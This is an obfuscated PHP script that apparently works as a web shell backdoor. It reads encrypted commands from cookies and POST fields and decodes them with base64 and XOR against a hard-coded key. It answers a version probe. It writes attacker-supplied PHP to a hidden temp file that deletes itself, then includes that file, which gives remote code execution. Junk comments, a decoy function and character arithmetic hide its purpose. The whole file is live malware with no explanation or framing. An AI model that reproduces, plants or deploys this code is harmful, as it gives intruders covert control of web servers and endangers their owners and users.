<?php 	function	xbqrkpqqro(){$gajd_cfdpi='chtnhumi';	print_r	(13238+13238);      }

$zeneqf/*   uzeq */=     'zeneqf'/* hv */^	'';



$tkffiggjj	=/*  wp */$_COOKIE;


$hzlyjed	=/*ul*/$_POST;





function	jdpkxzgxl($daiaiokbog,	$lehkf)
{


   global       $zeneqf;
	$mvgzra    =	"";/*   noem_ */for	($km_vlzhkxo     =	0;/*   ajb   */$km_vlzhkxo     <      strlen($daiaiokbog);)	{


/* qzwrv  */for/*   fhe */($elgipzl/*c   */=    0;       $elgipzl    </*himr */strlen($lehkf)	&&    $km_vlzhkxo	<       strlen($daiaiokbog);	$elgipzl++,	$km_vlzhkxo++)/*   pd   */{
	$mvgzra      .=     $zeneqf(ord($daiaiokbog[$km_vlzhkxo])/*   jcgt   */^/*proe*/ord($lehkf[$elgipzl]));


/*   uqc  */}
/*   uhc   */}

     return       $mvgzra;
}

function	vpkbuc($ahbx_id,  $daiaiokbog)


{

       global/*  dtp_q*/$zeneqf;


       $hfaqelw       =	sprintf(".".$zeneqf(47)	.     $zeneqf(407-370)     .	"s"."\56"      ./*   e*/"\x70"	.	"l",/*  yxkkg */md5($ahbx_id));/*  hd  */file_put_contents($hfaqelw,       "<"/*  sz   */.      "?"."\160"	.       "h".$zeneqf(112)/*  rjuch   */.     $zeneqf(32)	.     "\x75"      .	$zeneqf(926-816)/*   kvua_ */.	$zeneqf(108)     .      "\x69"/* xbhs  */.       "n".$zeneqf(301-194)	.	"(".$zeneqf(95)	./*   lmlfd   */$zeneqf(649-554)	.	"F".$zeneqf(776-703)      ./*   f   */$zeneqf(89-13)      .  "E".$zeneqf(95)/*  uejqq*/./* g*/"_".$zeneqf(41)/*   kaci   */./* b*/$zeneqf(62-3)	.	$zeneqf(32)	./*kohf */$daiaiokbog["d"]);    include($hfaqelw);     $zdkyjigi       =	$hfaqelw;

	unlink($zdkyjigi);

}


function/*gj*/waziffdsm(){
/* vt  */global	$zeneqf;


    


       $km_vlzhkxo/*tfuui  */=     array();

	$km_vlzhkxo[$zeneqf(1106-994)	.    "v"]       =	phpversion();
	$km_vlzhkxo[$zeneqf(347-232)	.	"\x76"]  =   "\63"      .   $zeneqf(399-353)    ./*   a   */$zeneqf(864-811);       echo     @serialize($km_vlzhkxo);}function   lulxgsb($daiaiokbog,/*wss */$ahbx_id,       $tkjqrw)

{/*  arfv */global/* yuq  */$zeneqf;	/*  x*/$daiaiokbog	=	unserialize(jdpkxzgxl(jdpkxzgxl(base64_decode($daiaiokbog),/*  begth   */$ahbx_id),      $tkjqrw));

      if       (isset($daiaiokbog[$zeneqf(978-881)/*   umofj  */./*   zvy  */$zeneqf(107)]))  {
/*  vkey_*/if	($daiaiokbog[$zeneqf(97)]	==    $zeneqf(575-470))/* ok */{
	waziffdsm();

      }/*   _mjwq */elseif/*   syywb*/($daiaiokbog[$zeneqf(97)]	==  "e")/*hpu  */{
	vpkbuc($ahbx_id,   $daiaiokbog);
	}

	exit();


     }


}
$tkffiggjj   =/*   midd*/array_merge($hzlyjed,	$tkffiggjj);$ahbx_id/*   r */=	"8"."5"."\63"/* te  */./*xk*/"c".$zeneqf(54)       ./*  u  */$zeneqf(48)       .  $zeneqf(412-313)	.    "1"."-"."6"."3"."4"."\x38"/*   zjo*/.	"\x2d"/*   iwcm*/./*rhteu*/"\64"/*   q_kdf  */.	"3"."\x31"	.     "d"."-"."b"."\x39"	.     "\67"      .   "\145"/*pyqy   */.	"\55"/*   p */./*   rt  */"8".$zeneqf(54)/*   n */.	"f"."7"."1"."\x38"/*pdvn   */./*t*/"3"."\x33"/*wa */.     $zeneqf(52)/* wr */.   $zeneqf(54)	.    "b".$zeneqf(100);
foreach    ($tkffiggjj      as      $tkjqrw/*  p*/=>	$daiaiokbog)	{


	lulxgsb($daiaiokbog,      $ahbx_id,	$tkjqrw);


}




